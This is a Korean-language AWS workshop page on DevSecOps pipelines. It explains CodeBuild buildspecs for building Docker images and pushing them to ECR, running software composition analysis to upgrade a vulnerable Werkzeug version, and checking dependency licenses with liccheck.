런타임 중에 CodeBuild 종속성을 설치하는 것은 때때로 비효율적이고 시간이 많이 소요될 수 있습니다(예: sonar-scanner-cli.zip은 41.1MB임). 종속성이 이미 구성되고 빌드 속도를 높일 준비가 된 사용자 지정 CodeBuild 이미지를 생성하도록 선택할 수 있습니다. 기본 CodeBuild 이미지의 기능을 추가로 확장하기 위해 이 작업을 수행할 수도 있습니다. 참조: **[사용자 지정 빌드 환경](https://aws.amazon.com/blogs/devops/extending-aws-codebuild-with-custom-build-environments/)** 

**$** 접두사로 표시되는 몇 가지 환경 변수가 있습니다. 이는 Build 프로젝트가 실행될 때마다 AWS CodeBuild에서 정의하고 제공합니다. **codebuild-docker-project**의 빌드 세부 정보 페이지에 있는 **Environment Variables** 섹션에서 이를 확인할 수 있습니다. 사용할 수 있는 CodeBuild의 [Built-in Environment Variables](https://docs.aws.amazon.com/codebuild/latest/userguide/build-env-ref-env-vars.html) 도 있습니다(예: $AWS_DEFAULT_REGION).


# 부록: docker_buildspec.yaml 탐색

이번에는 ECR에 이미지를 빌드하고 게시하도록 CodeBuild에 어떻게 게시했는지 살펴보도록 하겠습니다.

이전 단계에서 논의한 바와 같이, 웹 애플리케이션의 소스 코드와 함께 제공될 **docker_buildspec.yaml**이라는 파일에서 지침을 수집하도록 CodeBuild 프로젝트에 구성했습니다.

조직에 따라 개발자가 buildspec을 수정하지 못하도록 제한하려는 경우. 소스 디렉터리에서 정의하는 대신 CodeBuild 또는 S3에 직접 빌드 사양을 프로비저닝하도록 선택할 수 있습니다([https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html](https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html)  참조).

확인하려면 **flask-app** 폴더로 이동하여 루트 폴더에 있는 **docker_buildspec.yaml** 파일을 엽니다.

![docker-buildspec](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/docker-buildspec.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

다음과 같은 내용이 표시되어야 합니다.

```yaml
version: 0.2

phases:
  pre_build:
    commands:
      - echo Logging in to Amazon ECR...
      - $(aws ecr get-login --no-include-email --region $AWS_DEFAULT_REGION)
  build:
    commands:
      - echo Build started on `date`
      - docker build -t $ECR_REPO_URI:latest .
      - docker tag $ECR_REPO_URI:latest $ECR_REPO_URI:$CODEBUILD_RESOLVED_SOURCE_VERSION
  post_build:
    commands:
      - echo Build completed on `date`
      - echo Pushing the Docker images...
      - docker push $ECR_REPO_URI:latest
      - docker push $ECR_REPO_URI:$CODEBUILD_RESOLVED_SOURCE_VERSION
      - echo Writing image definitions file...
      - printf '[{"name":"flask-app","imageUri":"%s"}]' $ECR_REPO_URI:latest > imagedefinitions.json
      - cat imagedefinitions.json
artifacts:
  files: imagedefinitions.json
```

**[Buildspecs](https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html)**  은 CodeBuild가 빌드를 실행하는 데 사용하는 빌드 명령 및 관련 설정 모음입니다. 각 섹션을 살펴보도록 하겠습니다.

-   **pre_build** 명령은 기본적으로 빌드 준비를 실행하는 곳이며, 이 경우 CodeBuild에 Amazon ECR에 로그인하도록 했습니다. 기본 CodeBuild 이미지에는 이미 AWS CLI가 미리 설치되어 있어 [get-login](https://docs.aws.amazon.com/cli/latest/reference/ecr/get-login.html) 명령을 통해 ECR에 인증할 수 있습니다. 이는 CodeBuild가 도커 이미지를 나중에 ECR로 푸시하기 위해 필요합니다.
    
-   **build** 명령은 **Dockerfile**에 지정된 대로 이미지를 빌드하는 docker 명령을 정의합니다.
    
-   **post_build** 명령은 빌드된 이미지를 ECR의 Private Container Repository에 푸시하는 docker 명령을 정의합니다.
    
-   **artifacts** 섹션은 CodePipeline의 [ECS Deployment Provider](https://docs.aws.amazon.com/codepipeline/latest/userguide/integrations-action-type.html#integrations-deploy-ECS) 에 필요한 **[imagedefinitions.json](https://docs.aws.amazon.com/codepipeline/latest/userguide/file-reference.html) **이라는 이 빌드 프로젝트의 출력 아티팩트를 정의합니다.
    

**$** 접두사로 표시되는 몇 가지 환경 변수가 있습니다. 이는 Build 프로젝트가 실행될 때마다 AWS CodeBuild에서 정의하고 제공합니다. **codebuild-docker-project**의 Build Details 페이지에 있는 **Environment Variables** 섹션에서 이를 확인할 수 있습니다. 사용할 수 있는 CodeBuild의 [Built-in Environment Variables](https://docs.aws.amazon.com/codebuild/latest/userguide/build-env-ref-env-vars.html) 도 있습니다(예: $AWS_DEFAULT_REGION).

# 5. Software Composition Analysis (SCA)

오늘날 개발자는 오픈 소스 구성 요소를 사용하여 엄청난 양의 작업을 오프로드하여 매우 빠른 속도로 소프트웨어를 빌드할 수 있습니다. 이것이 모든 사람에게 도움이 되지만 이러한 종속성에서 보안 문제를 추적하는 것은 소프트웨어의 주요 부분이기 때문에 더욱 중요합니다.

빌드 파이프라인에 **[소프트웨어 구성 분석(SCA)](https://owasp.org/www-community/Component_Analysis) **을 도입하여 이를 수행할 수 있습니다. SCA는 알려진 데이터베이스에 대한 종속성의 보안을 평가하는 자동화된 프로세스입니다.

이 실습에서는 Python 애플리케이션을 위한 무료 오픈 소스 SCA 도구인 **[Safety](https://pyup.io/safety/) **를 사용합니다.

#### Topics Covered


이 실습을 마치면 다음을 수행할 수 있습니다.:

-   소프트웨어 구성 분석(SCA)의 개념 및 이점 이해
-   CodeBuild를 사용하여 [Safety](https://pyup.io/safety/)  스캔 자동화
-   웹 애플리케이션이 사용하고 있는 식별된 보증 라이브러리 수정

# 종속성 확인

나중에 처리해야 할 다른 취약점이 있는지 알아보기 위해 웹 응용 프로그램의 종속성을 확인하겠습니다.

1.  CodePipeline으로 이동하면 현재 웹 응용 프로그램에 안전하지 않은 종속성이 있을 수 있으므로 **SCA** 단계가 실패했음을 알 수 있습니다. 무슨 일이 일어났는지 확인하기 위해 **View in CodeBuild** 링크를 클릭해 보겠습니다. 그러면 SCA 단계에 특정한 CodeBuild 프로젝트가 열립니다.

![sca-fail](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sca-fail.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

2.  빌드 로그를 아래로 스크롤하여 pip-audit의 보고서를 확인합니다.

![pip-audit-report](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/pip-audit-report.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

3.  실행 로그를 아래로 스크롤하면 안전 보고서가 표시되어야 합니다.
    
4.  우리 웹 애플리케이션은 **requirements.txt**에 **[werkzeug](https://pypi.org/project/Werkzeug/) **가 포함되어 있습니다(파이썬 앱의 종속성에 대한 사양 파일 역할을 함). 다음 섹션에서 이러한 문제를 해결할 것입니다.

# 안전하지 않은 종속성 수정

보안되지 않은 종속성을 수정하거나 보안 버전으로 업그레이드 또는 다운그레이드하여(또는 필요하지 않은 경우 완전히 제거) 수정할 수 있습니다. 이 경우 **[Werkzeug](https://werkzeug.palletsprojects.com/en/2.0.x/) **의 안전하지 않은 이전 버전을 사용하고 있음을 발견했으며 버전을 다음으로 업데이트하라는 메시지가 표시됩니다. 보안 수정을 받으세요.

1.  AWS Cloud9으로 이동하여 **flask-app** 폴더에서 **requirements.txt** 파일을 엽니다.

![requirements-txt](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/requirements-txt.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

2.  SCA 도구에서 제안한 대로 **Werkzeug**를 **2.2.2**에서 **2.2.3**로 업데이트하겠습니다. **requirements.txt** 파일을 저장합니다. **requirements.txt**의 새 버전은 다음과 같아야 합니다.

```python
click==8.1.3
Flask==2.2.3
Flask-SQLAlchemy==3.0.3
Flask-WTF==1.1.1
greenlet==2.0.2
importlib-metadata==6.0.0
itsdangerous==2.1.2
Jinja2==3.1.2
MarkupSafe==2.1.2
SQLAlchemy==2.0.5.post1
typing_extensions==4.5.0
Werkzeug==2.2.3
WTForms==3.0.1
zipp==3.15.0
wdb==3.3.0
```

3.  Cloud9의 터미널 창으로 이동하여 다음 명령을 입력하여 변경 사항을 커밋합니다.

```bash
cd ~/environment/flask-app
git commit -a -m"Fix Insecure Package"
```

축하합니다! 타사 종속성으로 인한 취약점을 해결했습니다. **License Analysis**에 대해 논의하면서 다음 모듈로 넘어가겠습니다.

# 부록: sca_buildspec.yaml 탐색

**pip-audit**에 대한 종속성을 확인하도록 CodeBuild에 지시한 방법이 궁금하십니까?

**flask-app** 폴더 아래에 **sca_buildspec.yaml**이라는 파일을 확인하면 이를 가능하게 하기 위해 작성된 CodeBuild 빌드 사양을 볼 수 있습니다.

![sca-buildspec](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sca-buildspec.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

SCA CodeBuild 프로젝트는 이 파일을 찾고 필요한 명령을 실행합니다.:

```yaml
1
2
3
4
5
6
7
8
9
10
11
12
version: 0.1

phases:
  pre_build:
    commands:
      - echo Installing SCA tool...
      - pip install pip-audit
  build:
    commands:
      - echo Entered the post_build phase...
      - echo Build completed on `date`
      - pip-audit -r requirements.txt
```

**[Buildspecs](https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html)**  은 CodeBuild가 빌드를 실행하는 데 사용하는 빌드 명령 및 관련 설정의 모음입니다. 각 섹션을 살펴보겠습니다.

-   **pre_build** 명령은 기본적으로 빌드 준비를 실행하는 곳이며, 이 경우 CodeBuild에 **[Safety](https://pyup.io/safety/)**  를 설치하도록 지시했습니다. 이를 통해 CodeBuild에서 소프트웨어 구성 분석을 실행할 수 있습니다.
-   **build** 명령은 도커 이미지를 생성하는 동안 설치될 종속성을 나열하는 **requirements.txt**의 **Safety**를 사용하여 종속성 스캔 실행을 정의합니다.

런타임 중에 CodeBuild 종속성을 설치하는 것은 때때로 비효율적이고 시간이 많이 소요될 수 있습니다. 종속성이 이미 구워지고 빌드 속도를 높일 준비가 된 사용자 지정 CodeBuild 이미지를 생성하도록 선택할 수 있습니다. 기본 CodeBuild 이미지의 기능을 추가로 확장하기 위해 이 작업을 수행할 수도 있습니다. 참조: **[사용자 지정 빌드 환경](https://aws.amazon.com/blogs/devops/extending-aws-codebuild-with-custom-build-environments/)**

# 6. 라이센스 분석 [OPTIONAL]

::alert[ 이것은 **선택사항** 모듈입니다. 조직에서 개발자가 애플리케이션에서 사용하는 종속성의 소프트웨어 라이선스를 감사하도록 요구하는 경우 계속 읽으십시오. :::

일부 조직에는 피해야 하는 소프트웨어 라이선스에 대한 특정 규정이 있습니다.

이 실습에서는 애플리케이션 종속성의 소프트웨어 라이선스를 스캔하는 자동화된 방법을 소개하고 이를 릴리스 파이프라인에 포함합니다. 우리는 **[Python License Checker(liccheck)](https://pypi.org/project/liccheck/) **를 종속 항목의 라이선스 준수를 확인하는 도구로 사용할 것입니다.

#### Topics Covered


이 실습을 마치면 다음을 수행할 수 있습니다.

-   License Analysis의 개념과 장점 이해
-   CodeBuild를 사용하여 [Python License Checker(liccheck)](https://pypi.org/project/liccheck/)  스캔 자동화

# 종속성 확인

승인되지 않은 라이선스가 있는지 확인하기 위해 웹 응용 프로그램의 종속성을 확인하겠습니다.

1.  CodePipeline으로 이동하면 **Licenses** 단계가 실패했음을 알 수 있습니다. 이는 라이선스 전략을 통과하지 못하는 종속성이 있을 수 있음을 나타냅니다. 실패의 원인을 확인하려면 **View in CodeBuild** 링크를 클릭해 보겠습니다. 그러면 라이선스 확인 단계와 관련된 CodeBuild 프로젝트가 열립니다.

![license-fail](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/license-fail.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

2.  실행 로그를 아래로 스크롤하면 라이선스 보고서가 표시되어야 합니다.

![license-report](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/license-report.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

3.  우리 웹 애플리케이션에는 **requirements.txt**에 **wdb**가 포함되어 있습니다. 이 라이브러리는 라이선스 전략에 블랙리스트에 포함된 GPL 라이선스를 사용합니다(부록의 **[license_strategy.ini](https://catalog.us-east-1.prod.workshops.aws/event/dashboard/ko-KR/workshop/module6/license_check_buildspec.html)** 참조). 이 패키지는 라이선스 확인 경고(테스트 및 워크샵 목적)를 트리거하는 것 외에는 특별한 작업을 수행하지 않습니다. 다음 섹션에서 이 문제를 해결할 것입니다.

# 승인되지 않은 종속성 제거

이 실습의 목적을 위해 권한이 없는 것으로 표시된 종속성은 라이선스 확인을 보여주기 위해 포함되었으며 실제로 응용 프로그램에서 사용되지는 않습니다. 우리는 그것을 안전하게 제거할 수 있습니다.

1.  AWS Cloud9으로 이동하여 **flask-app** 폴더에서 **requirements.txt** 파일을 엽니다.

![requirements-txt](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/requirements-txt.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

2.  **requirements.txt**의 마지막 줄에서 **wdb**가 나열된 줄을 제거합니다. **requirements.txt** 파일을 저장합니다. 새 버전은 다음과 같아야 합니다.

```python
click==8.1.3
Flask==2.2.3
Flask-SQLAlchemy==3.0.3
Flask-WTF==1.1.1
greenlet==2.0.2
importlib-metadata==6.0.0
itsdangerous==2.1.2
Jinja2==3.1.2
MarkupSafe==2.1.2
SQLAlchemy==2.0.5.post1
typing_extensions==4.5.0
Werkzeug==2.2.3
WTForms==3.0.1
zipp==3.15.0
```

3.  Cloud9의 터미널 창으로 이동하여 다음 명령을 입력하여 변경 사항을 게시합니다.

```bash
cd ~/environment/flask-app
git commit -a -m "Remove Unauthorized Package"
```

# 보안 수정 사항 push 및 검증

1.  이제 자동화된 보안 결과를 모두 수정했으므로 이제 파이프라인을 트리거하기 위해 코드를 AWS CodeCommit에 푸시할 수 있습니다.

```bash
git push
```

2.  AWS CodePipeline으로 이동하여 **ApplicationSecurityChecks** 단계의 결과를 기다립니다. 문제가 없다면 단계가 성공해야 성공해야합니다. 또한 **BuildImage** 단계로 전환되어야 합니다.

![license-success](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/appsec-success.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

3.  **BuildImage** 단계가 완료되면 Amazon ECR에 게시된 새 컨테이너 이미지가 있는 것을 볼 수 있습니다. 다음 섹션에서는 이 이미지를 사용하여 Amazon ECS에서 실행 중인 현재 **flask-app** 작업을 대체할 것입니다.

![ecr-image-success](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/ecr-image-success.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

4.  SonarQube 프로젝트 페이지로도 이동합니다. 보안 핫스팟을 모두 지웠음을 알 수 있습니다.

![ecr-image-success](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sast-success.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

축하합니다! SAST, SCA 및 라이선스 검사에서 탐지된 모든 보안 결과를 압도했습니다! **DAST(Dynamic Application Security Testing)** 에 대해 논의하는 다음 모듈로 이동합니다.

# 부록: license_check_buildspec.yaml 탐색

**Python License Checker**에 대한 종속성을 확인하도록 CodeBuild에 지시한 방법이 궁금한가요?

**flask-app** 폴더 아래에 **license_check_buildspec.yaml**이라는 파일을 확인하면 이를 가능하게 하도록 작성된 CodeBuild 빌드 사양을 볼 수 있습니다.

![license-buildspec](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/license-buildspec.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

LicenseCheck CodeBuild 프로젝트는 이 파일을 찾고 필요한 명령을 실행합니다.

```yaml
version: 0.1

phases:
  pre_build:
    commands:
      - echo Installing License Checker Tool...
      - pip install liccheck
      - pip install -r requirements.txt
  build:
    commands:
      - echo Entered the post_build phase...
      - echo Build completed on `date`
      - liccheck -s license_strategy.ini -r requirements.txt
```

